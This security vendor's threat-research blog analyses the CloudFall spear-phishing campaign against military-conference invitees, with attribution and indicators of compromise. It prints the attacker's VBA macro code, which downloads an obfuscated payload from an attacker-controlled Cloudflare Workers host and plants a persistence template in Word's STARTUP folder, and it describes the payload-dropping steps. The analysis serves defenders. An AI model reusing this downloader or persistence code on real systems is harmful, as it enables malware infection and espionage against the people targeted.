    "plain_text": "# CloudFall Targets Researchers and Scientists Invited to International Military Conferences in Central Asia and Eastern Europe\n\n**[zscaler.com/blogs/security-research/cloudfall-targets-researchers-and-scientists-invited-international-military](https://www.zscaler.com/blogs/security-research/cloudfall-targets-researchers-and-scientists-invited-international-military)**\n\nIn August 2021, Zscaler ThreatLabz identified several malicious Microsoft Word documents\nwhich used a multi-stage attack-chain abusing Cloudflare Workers and features of MS\nOffice Word to target users in Central Asia and Eastern Europe.\n\nBased on the social engineering lures used in the decoy content, we conclude with a\nmoderate confidence level that the targets of this campaign were scientists and researchers\nwho were invited to International military conferences.\n\nThis multi-stage attack chain involves several new tactics, techniques, and procedures\n(TTPs) which have not been documented before. In the remainder of this blog, we'll share\nthe technical details of the attack as well as threat attribution.\n\nWe have named this threat actor CloudFall based on the network infrastructure used by\nthem. There is also a strong overlap between this threat actor and the CloudAtlas APT\ngroup. We will explain this in more detail in the threat attribution section of the blog.\n\nUnlike common macro-based document attacks, in this targeted campaign we observed the\nthreat actor abusing MS Office Word features to evade automated analysis systems. There\nwere multiple variants of attack-chains used by this threat actor which highlight the\nadversary's deep understanding of the MS Office Word application.\n\n## Threat Attribution\n\nWe performed threat attribution based on the below 4 parameters\n\n\n-----\n\n1. Attack-chain\n2. Naming convention of attacker-controlled C2 domains\n3. Regions targeted and content of the decoy files\n4. Correlation of creation and compilation timestamp of all the artifacts (documents and\npayloads)\n\n**Attack-chain: In all the cases, an MS Office Word document was used to download a**\nremote document template and carry out the attack in multiple stages. A lot of TTPs in this\nattack-chain have not been seen before and are unique to the threat actor in this case.\n\n**Naming conventions of attacker-controlled C2 domains: We observed a consistent**\npattern across all the C2 domains used in this targeted campaign. All the C2 servers used\nCloudflare Worker domains and most of the subdomain names were crafted to spoof\nMicrosoft service names such as Office 365.\n\noffice365.dc-microsoft.workers[.]dev\noffice365.microsoft-cloud.workers[.]dev\nasia.office365-cloud.workers[.]dev\neu.microsoft-365.workers[.]dev\napi.office365online.workers[.]dev\n\n**Regions targeted and content of the decoy files: Based on the instances we observed in**\nthis campaign, the regions targeted were Central Asia and Eastern Europe.\n\n**Correlation of creation and compilation timestamp of all the artifacts: We checked the**\ncreation timestamp for each of the stage-1 documents as well as the compilation timestamp\nof the payloads.\n\nAll the timestamps were in the range: 5:30 AM UTC to 8:30 AM UTC\n\nBased on this, we can say with a moderate confidence level that the threat actor was\nlocated in the eastern part of the world.\n\nBy combining all of the above observations, we can say with a moderate confidence level\nthat there is an overlap with CloudAtlas APT threat actor.\n\nCloudAtlas APT has targeted users in Central Asia and Eastern Europe in the past with\ndocuments sent in spear-phishing emails and downloaded remote templates. CloudAtlas\nhas also abused legitimate cloud-based services, such as CloudMe, in the past and used\ndomain names that spoof legitimate Microsoft services.\n\nThe tactics, techniques, and procedures (TTPs) are very unique in this instance so we\ncannot use them to specifically attribute to any threat actor.\n\n## Document decoy contents\n\n\n-----\n\nEach MS Office Word document in this targeted campaign displays an overlay image which\nwill be replaced by text when the document load is completed in the MS Office Word\napplication.\n\nFor the document with MD5 hash: 4cf8b660a79fc1b7cc4ea6422a02347d, seen in Figure 1,\nthe cover image is the logo of the German Federal Foreign Office.\n\n_Figure 1: Cover image displayed in Stage-1 document_\n\nAll the cover images of the remaining documents are shared in Appendix I. These cover\nimages also give a quick idea about the targeted region of the campaign.\n\nThe text content behind this overlay image is as shown in Figure 2.\n\n\n-----\n\n_Figure 2: Text present inside the document behind the cover image_\n\nThe text displayed contains information about the International Conference on Military\nStrategies and Methods. This conference invites researchers, scientists, and research\nscholars. The invitation above is a \"Call for contribution\".\n\nBased on this, we conclude that the targets of this campaign are researchers and scientists\nrelated to various disciplines such as Military strategy.\n\n## Attack flow\n\nIn this campaign, the threat actor used a complex multi-stage attack-chain, which we\nillustrate in Figure 3. This attack chain will be explained in more details step-by-step in the\nTechnical Analysis section of the blog.\n\nAlso, it is important to note that there are 2 different variants of attack-chains that we\nobserved for this threat actor. The second and the new variant was used for the first time on\nAugust 25th 2021 and we describe it later in the blog in the \"Attack-chain: Variant 2\"\nsection.\n\n**Variant #1**\n\n\n-----\n\n_Figure 3: Attack-chain of first variant_\n\n## Technical analysis\n\nIn this section, we will look at the first variant of the attack-chain. For the purpose of\ntechnical analysis we will consider the document with MD5 hash:\n4cf8b660a79fc1b7cc4ea6422a02347d\n\n**Stage-1: Main document**\n\nStage-1 document fetches a macro-based template document hosted on the attackercontrolled website and lures the user to enable the macros.\n\nThe interesting thing to note here is that the attacker doesn’t use the standard DOCX file\nformat (OOXML) for template injection where we have the XML file referencing the\ndocument template from a network path.\n\n\n-----\n\nInstead, in this case, the template injection is performed using the DOC file format. As a\nresult, static analysis tools like olevba cannot be used to extract the URL.\n\n**Stage-2: Macro-based template document**\n\nOnce macros are enabled by the user, the VBA macro code inside the downloaded\ntemplate is executed.\n\nThe macro code performs the following operations:\n\n**1. When the document is opened, it hides the decoy image shown to the user. The image is**\nan overlay for the text content which is displayed to the user once the macros are enabled.\n\nBelow is the relevant VBA macro code responsible for this.\n\n**Sub Document_Open()**\nDim i As Integer\n\nFor i = ActiveDocument.Shapes.Count To 1 Step -1\n\nActiveDocument.Shapes(i).Delete\n\nNext i\n\n**End Sub**\n\n**2. When the document is closed, it checks whether a document template file is present in**\nthe path: \"%appdata%\\Microsoft\\Word\\STARTUP\\Main.dotm\". If this file is not found, then it\nwill be downloaded and saved in this location.\nIt's important to note that the above directory path corresponds to STARTUP location used\nby Microsoft Office Word application to load global templates.\n\nThe template file is downloaded as base64-encoded data from the URL:\n\"https://cloud.digitalstorage.workers[.]dev/old/data\". The downloaded base64-encoded data\nis mangled and it requires a simple character substitution before decoding.\n\nMacro replaces \"$\" with \"A\" and \"#\" with \"Q\" in the mangled response before base64decoding.\n\nBelow is the relevant VBA macro code responsible for this.\n\n**Sub Document_Close()**\n\nIf Dir(Environ$(\"APPDATA\") + \"\\Microsoft\\Word\\STARTUP\\Main.dotm\", vbDirectory) =\nvbNullString Then\n\nDim xmlhttp As New MSXML2.XMLHTTP60\n\nDim data As String\n\nDim fileData As Integer: fileData = FreeFile\n\n\n-----\n\nxmlhttp.Open GET, https://cloud.digitalstorage.workers[.]dev/old/data, False\nxmlhttp.send\nIf Len(xmlhttp.responseText) > 0 Then\nOpen Environ$(\"APPDATA\") + \"\\Microsoft\\Word\\STARTUP\\Main.dotm\" For Binary Access\nWrite As fileData\nPut fileData,, DecodeBase64(Replace(Replace(xmlhttp.responseText, \"$\", \"A\"), \"#\n\", \"Q\"))\nClose\nEnd If\n\n**End Sub**\n\n**Stage-3: Persistence template**\n\nThe template file \"Main.dotm\" acts as a persistence template since it is loaded whenever\nthe Microsoft Word application is started.\n\nSimilar to Stage-2, this is also a macro-based template. The malicious macro code is\ndefined under the AutoExit function which is executed when the Microsoft Word application\nis closed or the global template defining it is unloaded.\n\nUpon execution, the macro code downloads a base64-encoded binary either from\n\"mirror.advancestore.workers[.]dev/max/bs\" or \"mirror.advancestore.workers[.]dev/min/bs\"\nbased on the checks performed. Similar to Stage-2, the base64-encoded binary is mangled\nand requires character substitution before decoding. Once decoded, the macro code drops\nit as the next stage payload in the path %localappdata%\\Photos\\Microsoft.Photos.exe and\nexecutes it.\n\n**Note: The dropped file name spoofs legitimate Windows binary for Microsoft Photos.**\n\nRelevant code is shown in Figure 4.\n\n\n-----\n\n_Figure 4: VBA macro code of Stage-3 persistence document template_\n\n**Stage-4: Dropped binary**\n\nThe Stage-4 dropped binary is heavily obfuscated using control flow obfuscation, function\ninlining, stack-based strings generation, strings encoding, etc which makes the dynamic\nanalysis of the binary inside a debugger difficult. To further hinder the dynamic analysis\nusing debugger, the binary performs self checksum check to detect any attached debugger.\n\nIt also hooks the ZwProtectVirtualMemory API. To allocate memory region for trampoline,\nthe binary performs memory allocation brute force to allocate the memory just after the last\nloaded dll memory space. Figure 5 below shows the trampoline code.\n\n_Figure 5: API hook added for ZwProtectVirtualMemory with an unconditional JMP_\n_trampoline_\n\nExecuting further, the malicious binary checks for the presence of the file conf.h in the\ncurrent working directory. If the file exists, it tries to read and parse it.\n\nFigure 6 below shows the code which performs string generation and does the file\nexistence check for conf.h\n\n\n-----\n\n_Figure 6: Code section which performs conf.h string generation and file existence check_\n\n**Note: The file is likely fetched and dropped by the binary as part of C2 communication**\n\nIf the conf.h file doesn’t exist, then it checks the following browser directories for the\npresence of specific files one at a time:\n\n**1. %appdata%\\Mozilla\\Firefox\\Profiles**\n\n**2. %localappdata%\\Google\\Chrome\\User Data\\Default**\n\n**3. %appdata%\\Opera Software\\Opera Stable**\n\nFor the files found, it adds up the size of all these files and checks if it is greater than or\nequal to the specified threshold value. In case the calculated size is less than the threshold\nvalue or if none of the browser directory mentioned above exists, the binary terminates.\n\n**Note: The size check is likely performed to detect analysis environments like Sandbox and**\nVirtual Machine\n\nFollowing files are used for calculating the size in case of Chrome browser:\n\n\n-----\n\n%localappdata%\\Google\\Chrome\\User Data\\Default\\History\n%localappdata%\\Google\\Chrome\\User Data\\Default\\Visited Links\n%localappdata%\\Google\\Chrome\\User Data\\Default\\Favicons\n%localappdata%\\Google\\Chrome\\User Data\\Default\\Web Data\n%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies\n%localappdata%\\Google\\Chrome\\User Data\\Default\\Media History\n%localappdata%\\Google\\Chrome\\User Data\\Default\\IndexedDB\\{sub_dir}\\*\n\nFigure 7 below shows the code responsible for performing the threshold check.\n\n_Figure 7: Code section which performs the threshold check_\n\nIf the check passes for any of the three browser directories mentioned above then it starts\nthe network communication.\n\n## Network Communication\n\nThe network communication is performed over standard TCP/IP protocol. The details for the\nC2 server communication are mentioned below:\n\n**C2 Domain: curly-waterfall-360d.fetrikekke531.workers.dev**\n\n**Beacon request URI: auth/local/register**\n\n**Request Type: POST**\n\n**[Data: {\\\"email\\\":\\\"[email protected]\\\",\\\"password\\\":\\\">*#-](https://www.zscaler.com/cdn-cgi/l/email-protection)**\nL:3Wy5;;#/[N^{uh{P6t\\\",\\\"username\\\":\\\"B60FB93BC49DF8848C4AF287BC112CF6_oAj\\\"}\n\nInside the POST request data there are three key-value pairs which are generated as\nspecified below.\n\n**email - {random_data}@{random_data}.local**\n\n**password - {random_data}**\n\n**username - {encoded %USERPROFILE% creation timestamp}_{random_data}**\n\n\n-----\n\n**Note: During analysis we didn t get any active response from the C2 server. As a result, we**\ncouldn’t analyse the full behaviour of the malicious binary.\n\n**[+] SSL Certificate**\n\nThe thumbprint of the SSL certificate of the C2 domain is:\n5cdf93a4081898d99a686ad472b553cddaa9f3bf\n\n**Below are some important details of this SSL certificate:**\n\n**Thumbprint: 5cdf93a4081898d99a686ad472b553cddaa9f3bf**\n**Signature Algorithm: sha256RSA**\n**Issuer: C=US CN=R3 O=Let's Encrypt**\n**Validity**\n**Not Before: 2021-08-18 06:57:36**\n**Not After: 2021-11-16 06:57:34**\n**Subject: CN=*.fetrikekke531.workers[.]dev**\n\nUsing the thumbprint of the SSL certificate as a pivot, we discovered another C2 domain:\nvirustotall-360d.fetrikekke531.workers[.]dev\n\nAs we can see, the subdomain in above domain spoofs VirusTotal.\n\n## Attack-chain: Variant 2\n\nThe second variant of this attack, which we observed in August 2021 made significant\nchanges to the macro code used in the document to deploy the payload on the machine.\n\nMD5 hash of the document: 2043b7129bfbe83c95a27c0a20d10612\n\nSimilar to variant 1, variant 2 also downloads a remote document template hosted on an\nattacker-controlled Cloudflare Worker instance.\n\nHowever, unlike variant 1, in this case, the persistence document template as well as the\nfinal payload—both are embedded inside the stage-2 document itself.\n\nIt uses a clever technique to extract these contents and drop them on the machine.\n\nThis attack flow can be represented using the diagram shown in Figure 8.\n\n**Variant #2**\n\n\n-----\n\n_Figure 8: Attack-chain of the second variant_\n\nBelow is the description of attack flow.\n\n**1. Stage-1 document downloads remote document template (Stage-2)**\n\n**2. Since MS Office Word was used to download the document template (Stage-2), by**\ndefault it will be present inside the INetCache directory. The VBA macro code uses a clever\ntechnique to locate this file in the path:\n\"%localappdata%\\Microsoft\\Windows\\INetCache\\Content.MSO\\\" as shown in Figure 9.\n\n\n-----\n\n_Figure 9: VBA macro code of Stage-2 document template of variant 2_\n\n**a) This code enumerates the files in the directory:**\n\"%localappdata%\\Microsoft\\Windows\\INetCache\\Content.MSO\\\" until it finds a file with size\n70400 (truncated)\n\n**b) Once it finds the file, it will Unzip the contents to the directory path:**\n\"%localappdata%\\VirtualEnv\". OOXML file format is essentially an archive file format, and\nthat’s why the macro unzips it.\n\n**c) Inside the OOXML file, there is an XML file called Archive.xml which contains an**\nencoded version of the persistence template. This is decoded and dropped to the path:\n%appdata%\\Microsoft\\Word\\STARTUP\\Settings.dotm\n\n**d) In order to decode the contents of Archive.xml it performs character substitution to**\nrestore the original characters of the base64-encoded string. Then it adds the prefix: \"UEs\"\nand base64 decodes it.\n\n**Code: Base64Decode(\"UEs\" + Replace(Replace(data, \"#\", \"A\"), \"@\", \"Q\"))**\nThis type of custom base64 decoding is similar to variant 1\n\n**3. Once a new instance of the Word application is started on the machine, this persistence**\ntemplate is loaded and the next sequence of steps are carried out to drop the final payload\nas shown in Figure 10.\n\n_Figure 10: VBA macro code of persistence template of variant 2_\n\n\n-----\n\n**a) Decodes and extracts the payload from WebArchive.xml file. The method for decoding is**\nsimilar to the one described previously.\n**b) The decoded file is the final payload which will be dropped to the path:**\n%localappdata%\\VirtualEnv\\word\\Virtual.exe\n\n**4. Finally the payload Virtual.exe will be executed. This payload is similar to the one**\ndescribed above.\n\n## Zscaler Cloud Sandbox detection\n\nFigure 11 shows the sandbox detection for the final payload.\n\n_Figure 11: Zscaler Cloud Sandbox detection_\n\nIn addition to sandbox detections, Zscaler’s multilayered cloud security platform detects\nindicators at various levels.\n\n[Win32.Backdoor.CloudFall](https://threatlibrary.zscaler.com/?keyword=Win32.Backdoor.CloudFall)\n\n[Win64.Backdoor.CloudFall](https://threatlibrary.zscaler.com/?keyword=Win64.Backdoor.CloudFall)\n\n[VBA.Downloader.CloudFall](https://threatlibrary.zscaler.com/?keyword=VBA.Downloader.CloudFall)\n\n## Indicators of compromise\n\n**[+] Document Hashes**\n\n**MD5** **File name** **Uploader**\n**country**\n\n\n-----\n\n4774483bb72ddfa0f6e4b8c5be7093dd Military cooperation 2021.doc Ukraine\n\n\ne4c29642f3803b1bc9aa61603696bb4b International Conference on\nMilitary Strategy and Strategic\nIntelligence 2021.doc\n\n\nIndia\n\n\n5cba8589a4a76377f9340ef30d6fec41 Tender information.doc Kazakhstan\n\n\n4cf8b660a79fc1b7cc4ea6422a02347d CONFIDENTIAL - International\nConference on Military Strategies\nand Methods.doc\n\n\nSwitzerland\n\n\n2043b7129bfbe83c95a27c0a20d10612 Situation report - August 25.doc USA\n\n**[+] Binary Hashes**\n\n**MD5** **File name**\n\ne35a1add6ddc944e9a757cb65a73db19 Microsoft.Photos.exe\n\nabe0b037dfa52d895c1cd8148988fcc1 Virtual.exe\n\n**[+] C2 Domains - Documents**\n\ndocuments.publicserver[.]workers.dev\n\noffice365.dc-microsoft.workers[.]dev\n\ncloud.digitalstorage.workers[.]dev\n\nplug.repository.workers[.]dev\n\nmirror.advancestore.workers[.]dev\n\noffice365.microsoft-cloud.workers[.]dev\n\nasia.office365-cloud.workers[.]dev\n\neu.microsoft-365.workers[.]dev\n\n\n-----\n\napi.office365online.workers[.]dev\n\n**[+] C2 Domains - Dropped binary**\n\ncurly-waterfall-360d.fetrikekke531.workers[.]dev\n\nfalling-haze-1812.jerkufetra754.workers[.]dev\n\n**[+] C2 domains - Additional**\n\nvirustotall-360d.fetrikekke531.workers[.]dev\n\nfalling-haze-1813.jerkufetra754.workers[.]dev\n\n**[+] Download URL**\n\n**Component** **URL**\n\nStage-2 marco doc documents.publicserver[.]workers.dev/docs/lates\n\n\noffice365.dc-microsoft.workers[.]dev/main/doc\n\noffice365.microsoftcloud.workers[.]dev/encoding/data/office\n\nasia.office365-cloud.workers[.]dev/office/online\n\n\nStage-3 persistence\ntemplate\n\n\ncloud.digitalstorage.workers[.]dev/old/data\n\nplug.repository.workers[.]dev/modules/private\n\n\nStage-4 exe payload mirror.advancestore.workers[.]dev/max/bs\n\n\nmirror.advancestore.workers[.]dev/min/bs\n\npublic.datastore.workers[.]dev/strong/bs\n\n\n\n**[+] SSL certificate thumbprints**\n\n5cdf93a4081898d99a686ad472b553cddaa9f3bf\nc4c3394b0fe4534f5c63ad395cc028b347ba4fa3\n\n\n-----\n\n**[+] File paths**\n\n**// Persistence template**\n\n%appdata%\\Microsoft\\Word\\STARTUP\\Main.dotm\n\n%appdata%\\Microsoft\\Word\\STARTUP\\Future.dotm\n\n%appdata%\\Microsoft\\Word\\STARTUP\\Settings.dotm\n\n**// Dropped/Downloaded files**\n\n%localappdata%\\Photos\\Microsoft.Photos.exe\n\n%localappdata%\\Tools\\build.exe\n\n%localappdata%\\VirtualEnv\\word\\virtual.exe\n\n%localappdata%\\Photos\\conf.h\n\n%localappdata%\\VirtualEnv\\word\\conf.xml\n\n## Appendix I\n\n**[+] Decoy #2**\n\n\n-----\n\n**[+] Decoy #3**\n\n\n-----\n\n**[+] Decoy #4**\n\n\n-----\n\n**[+] Decoy #5**\n\n\n-----\n\n## Appendix II\n\n// Conferences referenced in decoy content\n\nhttp://researchworld.org/Conference2021/Uzbekistan/1/I2C2E/\n\nhttps://waset.org/military-strategy-and-strategic-intelligence-conference\n\nhttps://www.offshore-technology.com/comment/saudi-aramco-berri-field-upgrade/\n\nhttps://waset.org/military-studies-and-leadership-conference\n\n\n-----",
